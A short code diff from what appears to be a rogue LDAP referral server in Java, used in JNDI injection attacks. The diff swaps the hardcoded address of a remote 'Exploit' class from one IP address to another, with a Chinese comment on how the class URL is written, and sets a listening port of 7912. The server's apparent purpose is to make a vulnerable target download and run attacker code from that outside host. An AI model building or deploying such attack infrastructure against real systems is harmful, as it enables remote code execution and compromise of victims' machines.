@@ -32,7 +32,7 @@ public class LDAPRefServer {
     /**
      * class地址 用#Exploit代替Exploit.class
      */
-    private static final String EXPLOIT_CLASS_URL = "http://49.232.17.193/#Exploit";
+    private static final String EXPLOIT_CLASS_URL = "http://140.143.119.132/#Exploit";
 
     public static void main(String[] args) {
         int port = 7912;
